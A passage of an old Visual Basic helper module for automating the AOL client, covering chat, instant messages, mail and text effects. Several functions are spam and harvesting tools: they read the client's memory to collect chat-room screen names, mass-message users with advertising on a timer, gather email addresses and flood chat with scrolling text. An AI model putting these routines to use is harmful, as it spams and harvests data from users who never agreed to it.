AOLChatSend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Dark Labyrinth ßy ·Labyrinth" & Chr(4) & "/-=!=-\"
End Sub
Function CutStringDown(ByVal pws As String) As String
On Error Resume Next
CutStringDown = Trim(Left$(pws, InStr(pws, Chr$(0)) - 1))
End Function
Function JunoActivate()
X = GetCaption(JunoWindow)
AppActivate X
End Function
Function AOLEnterPR(room As String)
Theroomcode = "aol://2719:2-2-" & room
AOLKeyword (Theroomcode)
End Function

Function AOLFindIM()
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
AOLFindIM = IM%
End Function


Function AOLLastChatLineSN()
TheLastChatLine = AOLLastChatLine
For words = Len(TheLastChatLine) To 1 Step -1
oneletter2 = Mid(TheLastChatLine, words, 1)
Oneletter = Mid(TheLastChatLine, 1, words)
If oneletter2 = ":" Then
   Oneletter = Mid(TheLastChatLine, 1, words)
   Oneletter = Mid(TheLastChatLine, 1, words)
1   GoTo Last
   End If
Next words
Last:
'Oneletter
Letters = Len(Oneletter)
Thesnlen = Letters - 1
finalsn = Left$(Oneletter, Thesnlen)
AOLLastChatLineSN = finalsn
End Function

Function AOLLastChatLineText()
MOVEIT = Len(AOLLastChatLineSN)

Thesnlen = MOVEIT + 2
TheLineLen = Len(AOLLastChatLine)

Spacing = TheLineLen - Thesnlen
TheChatText = Right$(AOLLastChatLine, Spacing)
AOLLastChatLineText = TheChatText
End Function


Function ASCII()
ASCII = "«›‹§›|[ "
End Function



Function Chat_SupRoom()
AOLIsOnline
If AOLIsOnline = 0 Then GoTo Last
AOLFindRoom
If AOLFindRoom = 0 Then GoTo Last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
AOLHandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call AOLChatSend("~Genghis~ Sup, " & Person$)
pause (0.4)
Next Index
Call CloseHandle(AOLProcessThread)
End If
Last:
End Function

Function Chat_RoomAdertising(mess As String)
'What this does is when people talk in the room it
'sends them a IM saying what ever you want.
'Just put this call on a timer and watch it go.
'if you really want to you could make it add the
'screen name to it and then it wont IM them twice.
theguy = AOLLastChatLineSN
Call AOLInstantMessage(theguy, mess)
End Function


Function FindAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
FindAOL = aol%
End Function

Function FindKeyword()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
keyw% = FindChildByTitle(MDI%, "Keyword")
Kedit% = FindChildByClass(keyw%, "_AOL_Edit")
FindKeyword = Kedit%
End Function

Function FindNewIM()
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
 End Function

Function FindWelcome()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
FindWelcome = FindChildByTitle(MDI%, "Welcome, ")
End Function

Function IM_RoomIMer(mess As String)
AOLIsOnline
If AOLIsOnline = 0 Then GoTo Last


On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
AOLHandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call AOLInstantMessage(Person$, mess)
Next Index
Call CloseHandle(AOLProcessThread)
End If
Last:
End Function

Function JunoTab()
JunoTab = FindChildByClass(JunoWindow, "#32770")
End Function

Function Mail_CloseMail()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
killwin (A3000%)
End Function

Function Mail_DeleteSent()
Call AOLRunMenuByString("Check Mail You've &Sent")

aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
again:
pause (1)
A3000% = FindChildByTitle(A2000%, "Outgoing Mail")
If A3000% = 0 Then GoTo again
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
Delete% = FindChildByTitle(A3000%, "Delete")
pause (6)
AOLButton (Delete%)
killwin (A3000%)
End Function

Function Mail_KeepAsNew()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
KeepAsNew% = FindChildByTitle(A3000%, "Keep As New")
AOLButton (KeepAsNew%)
End Function


Function Mail_DeleteSingle()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
Delete% = FindChildByTitle(A3000%, "Delete")
AOLButton (Delete%)
End Function


Function Mail_FindComposed()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI = FindChildByClass(aol%, "MDIClient")
Mail_FindComposed = FindChildByTitle(MDI, "Compose Mail")
End Function

Function Mail_ForwardMail()
FindForwardWindow
Person = SN
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Fwd: ")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop
a = SendMessageByString(peepz%, WM_SETTEXT, 0, NameListing)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, Mail_Subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, Mail_Message)
AOLIcon (icone%)
End Function

Function GetFromINI(AppName$, KeyName$, FileName$) As String
   Dim RetStr As String
   RetStr = String(255, Chr(0))
   GetFromINI = Left(RetStr, GetPrivateProfileString(AppName$, ByVal KeyName$, "", RetStr, Len(RetStr), FileName$))
End Function
Function Mail_ClickForward()
ActivateAOL
SendKeys "{TAB}{ }"
End Function

Function Mail_KillComposed()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI = FindChildByClass(aol%, "MDIClient")
Composed = FindChildByTitle(MDI, "Compose Mail")
killwin (Composed)
End Function
Function MAil_BuildList(lst As ListBox)
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
pause (7)
End If

mailwin = FindChildByTitle(AOLMDI, "New Mail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo Last
mailtree = FindChildByClass(mailwin, "_AOL_TREE")
   NameLen = SendMessage(mailtree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(NameLen, 0)
    X = SendMessageByString(mailtree, LB_GETTEXT, Counter, Buffer$)
    Tabpos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (Tabpos)))
    lst.AddItem Buffer$
 pause (0.001)
Counter = Counter + 1
GoTo Start
Last:

End Function
Function Mail_ListMail(box As ListBox)
box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
pause (7)
End If

mailwin = FindChildByTitle(AOLMDI, "New Mail")
AOLCountMail
thec = AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo Last
mailtree = FindChildByClass(mailwin, "_AOL_TREE")
   NameLen = SendMessage(mailtree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(NameLen, 0)
    X = SendMessageByString(mailtree, LB_GETTEXT, Counter, Buffer$)
    Tabpos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (Tabpos)))
    
    
    For Trimspace = 1 To Len(Buffer$)
TheChar$ = Mid(Buffer$, Trimspace, 1)
thechars$ = thechars$ & TheChar$
If TheChar$ = "@" Then
box.AddItem Buffer$
'LB_DELETESTRING
mailtree2% = mailtree
A6000% = SendMessageByString(mailtree2%, LB_DELETESTRING, Counter, Buffer$)
GoTo NEC
End If
Next Trimspace

NEC:
 pause (0.0001)
Call Mail_SetCursor("" & Counter)
Counter = Counter + 1
'Form1.status.Caption = "Retriving: " & Counter & "/" & thec
GoTo Start
Last:
End Function
Function AntiSpam(box As ListBox)
'Counter = Form1.List1.ListCount
Current = 0
Start:
'Targets = Form1.List1.List(Current)
Po = 0
AG:
txtlen = Len(Targets)
tagets = Text_Looping("" & Targets)
varif = Left$(Targets, 1)
If varif = "@" Then
GoTo fin2
End If
Po = Po + 1
If Po = txtlen Then GoTo fin
GoTo AG
fin:
'Form1.List1.RemoveItem (Current)
fin2:
pause (0.0001)
'Form1.status.Caption = "Scanning: " & Current & "/" & Counter
If Counter = Current Then GoTo Last
Current = Current + 1
GoTo Start
Last:
End Function


Function Mail_Out_CloseMail()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
killwin (A3000%)
End Function

Function Mail_Out_CursorSet(mailIndex As String)
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function






Function Mail_Out_ListMail(box As ListBox)
box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
pause (7)
End If

mailwin = FindChildByTitle(AOLMDI, "Outgoing FlashMail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo Last
mailtree = FindChildByClass(mailwin, "_AOL_TREE")
   NameLen = SendMessage(mailtree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(NameLen, 0)
    X = SendMessageByString(mailtree, LB_GETTEXT, Counter, Buffer$)
    Tabpos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (Tabpos)))
    box.AddItem Buffer$
 pause (0.001)
Counter = Counter + 1
GoTo Start
Last:
End Function

Function Mail_Out_MailCaption()
End Function

Function Mail_Out_MailCount()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
Mail_Out_MailCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_Out_PressEnter()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function


Function Mail_PressEnter()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function



Function Mail_SetCursor(mailIndex As String)
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function Mail_BulkSetup()
ActivateAOL
AOLChangeCaption ("America  Online(Setting up Preferances)")
SetPreference
AOLChangeCaption ("America  Online Setting Parent Mail")
AOLChangeCaption ("America  Online")
who = AOLGetUser
Call RanSub
AOLChangeCaption ("America  Online(Mailing Template)")
Call Mail_SendNew(who, Mail_Subject, Mail_Message)
AOLChangeCaption ("America  Online(Opening Mail)")
AOLRunMenuByString ("Read &New Mail")
AgainW:
X% = FindMailBox
Call ChangeCaption(X%, "Automated Network Advertising(MailBox)")
AOLChangeCaption ("America  Online(Waiting on mail..)")
'X = AOLCountMail
pause (2)
Y = AOLCountMail
'If X < Y Then GoTo AgainW
AOLChangeCaption ("America  Online(Setting Up First Mail)")
pause (3)
Y = AOLCountMail
aol% = AOLWindow()
Mail_SetCursor (Y - 1)
Mail_PressEnter
AOLChangeCaption ("America  Online")
End Function

Function FindChat2_SetCursor(roomindex As String)
RoomTree% = FindChatList2
A6000% = SendMessageByString(RoomTree%, LB_SETCURSEL, roomindex, 0)
End Function
Function FindChat1_SetCursor(roomindex As String)
RoomTree% = FindChatList1
A6000% = SendMessageByString(RoomTree%, LB_SETCURSEL, roomindex, 0)
End Function

Function Mail_MailCaption()
FindOpenMail
Mail_MailCaption = GetCaption(FindOpenMail)
End Function

Function IM_MassIMer(lst As ListBox, mess As String)
a = -1
Start:
a = a + 1
If a = lst.ListCount Then GoTo Last
theperson = lst.List(a)
Call AOLInstantMessage(theperson, mess)
GoTo Start
Last:
End Function

Function ReadFile(Where As String)
filenum = FreeFile
Open (Where) For Input As filenum
info = Input(LOF(filenum), filenum)
info = ReadFile
End Function


Function SpiralScroll(txt As String)
Dim AODCOUNTER, a, thetxtlen
AODCOUNTER = 1
thetxtlen = Len(txt)
Start:
a = a + 1
If a = thetxtlen Then GoTo Last
X = Text_Looping(txt)
txt = X
AOLChatSend X
pause (0.13)
AODCOUNTER = AODCOUNTER + 1
If AODCOUNTER = 4 Then
   AODCOUNTER = 2
   End If
GoTo Start
Last:

End Function

Function SpiralScrollTemplated(Template As String, txt As String)
Dim AODCOUNTER, a, thetxtlen
AODCOUNTER = 1
thetxtlen = Len(txt)
Start:
a = a + 1
If a = thetxtlen Then GoTo Last
X = Text_Looping(txt)
txt = X
AOLChatSend Template & X
pause (0.5)
AODCOUNTER = AODCOUNTER + 1
If AODCOUNTER = 4 Then
   AODCOUNTER = 2
   End If
GoTo Start
Last:

End Function
Function Text_backwards(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = nextchr$ & newsent$
Loop
Text_backwards = newsent$
End Function
Function Text_elite(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If Crapp% > 0 Then GoTo Greed
If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "]V["
If nextchr$ = "m" Then Let nextchr$ = "^^"
If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "ö"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
If nextchr$ = "<" Then Let nextchr$ = "«"
If nextchr$ = ">" Then Let nextchr$ = "»"
If nextchr$ = "*" Then Let nextchr$ = "¤"
If nextchr$ = "`" Then Let nextchr$ = "“"
If nextchr$ = "'" Then Let nextchr$ = "”"
If nextchr$ = "0" Then Let nextchr$ = "º"
Let newsent$ = newsent$ + nextchr$
Greed:
If Crapp% > 0 Then Let Crapp% = Crapp% - 1
DoEvents
Loop
Text_elite = newsent$
End Function
Function Text_Hacker(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
Text_Hacker = newsent$
End Function
Function Text_Spaced(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
Text_Spaced = newsent$
End Function


Function Text_Looping(txt As String)
Dim thecaption, Captionlen, middlelen, Firstletter, Middle
If txt = "" Then GoTo dead
thecaption = txt
Captionlen = Len(thecaption)
middlelen = Captionlen - 1
Firstletter = Left$(thecaption, 1)
Middle = Right(thecaption, middlelen)
Text_Looping = Middle & Firstletter
GoTo Last
dead:
Text_Looping = ""
Last:
End Function

Function Text_StripLetter(txt As String, which As String)
'This takes out a certain letter
'Which is the letter you take out(its in number value)
'For example..in the work Khan if I wanted to
'take out the H I would use
'Text_StripLetter("Khan", 2)
txtlen = Len(txt)
Before = Left$(txt, which - 1)
beforelen = Len(Before)
afterthat = txtlen - beforelen - 1
after = Right$(txt, afterthat)
MsgBox after
Text_StripLetter = Before & after
End Function

Public Sub TextColor_Blue(txt As TextBox)
txt.ForeColor = &HFFFF00
pause 0.1
txt.ForeColor = &HFF0000
pause 0.1
txt.ForeColor = &HC00000
pause 0.1
txt.ForeColor = &H800000
pause 0.1
txt.ForeColor = &H400000
pause 0.1
End Sub

Public Sub TextColor_Teal(txt As TextBox)
txt.ForeColor = &HFFFF00
pause 0.1
txt.ForeColor = &HC0C000
pause 0.1
txt.ForeColor = &H808000
pause 0.1
txt.ForeColor = &H404000
pause 0.1
End Sub

Public Sub TextColor_Green(txt As TextBox)
txt.ForeColor = &HFF00&
pause 0.1
txt.ForeColor = &HC000&
pause 0.1
txt.ForeColor = &H8000&
pause 0.1
txt.ForeColor = &H4000&
pause 0.1
End Sub

Public Sub TextColor_Yellow(txt As TextBox)
txt.ForeColor = &HFFFF&
pause 0.1
txt.ForeColor = &HC0C0&
pause 0.1
txt.ForeColor = &H8080&
pause 0.1
txt.ForeColor = &H4040&
pause 0.1
End Sub


Public Sub TextColor_Red(txt As TextBox)
txt.ForeColor = &HFF&
pause 0.1
txt.ForeColor = &HC0&
pause 0.1
txt.ForeColor = &H80&
pause 0.1
txt.ForeColor = &H40&
pause 0.1
End Sub

Function Text_TurntoUCase(txt As String)
Text_TurntoUCase = UCase(txt)
End Function

Function Text_TurntoLCase(txt As String)
Text_TurntoLCase = LCase(txt)
End Function
Sub ULAlign(frm As Form)
    Dim X, Y                    ' New top, left for the form
    Y = 0
    X = 0
    frm.Move X, Y             ' Change location of the form

End Sub

Sub PlayWav(File)
SoundName$ = File
SoundFlags& = &H20000 Or &H1
Snd& = sndPlaySound(SoundName$, SoundFlags&)
End Sub


Sub AOLChangeCaption(Newcaption As String)
Call AOLSetText(AOLWindow(), Newcaption)
End Sub

Sub ChangeCaption(HWD%, Newcaption As String)
Call AOLSetText(HWD%, Newcaption)
End Sub
Function AOLGetTopWindow()
AOLGetTopWindow = GetTopWindow(AOLMDI())
End Function

Sub AOLSetFocus()
'SetFocusAPI doesn't work AOL because AOL has added
'a safeguard against other programs calling certain
'API functions (like owner-drawn things and like.)
'This is the only way known for setting the focus
'to AOL.  This is a normal VB command!
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Public Sub AOLMassIM(lst As ListBox, txt As TextBox)
lst.Enabled = False
i = lst.ListCount - 1
lst.ListIndex = 0
For X = 0 To i
lst.ListIndex = X
Call AOLInstantMessage(lst.Text, txt.Text)
pause 0.5
Next X
lst.Enabled = True
End Sub
Function FindChatList1()
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
FindChatList1 = FindChildByClass(findchat%, "_AOL_Listbox")
End Function
Sub AOL_FindChatROOMZ(lst As ListBox)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
HRE% = FindChildByClass(findchat%, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(HRE%, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(HRE%, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(HRE%, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
lst.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub
Sub AOL_FindChatROOMZ2(lst As ListBox)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
NWE% = FindChildByClass(findchat%, "_AOL_Listbox")
HRE% = GetWindow(NWE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
AOLThread = GetWindowThreadProcessId(HRE%, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(HRE%, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(HRE%, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
lst.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub


Function FindChatMemberButton()
FindChatMemberButtonp% = FindChatViewButton1
FindChatMemberButton = GetWindow(FindChatMemberButtonp%, GW_HWNDNEXT)
End Function
Function FindChatList2()
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
findchat% = FindChildByTitle(AOLMDI(), "Find a Chat")
NWE% = FindChildByClass(findchat%, "_AOL_Listbox")
HRE% = GetWindow(NWE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
HRE% = GetWindow(HRE%, GW_HWNDNEXT)
FindChatList2 = HRE%
End Function
Function MemberAdvance()
OpenMemberDirectory
MemB% = MemberDirectory
X% = FindChildByClass(MemB%, "_AOL_Icon")
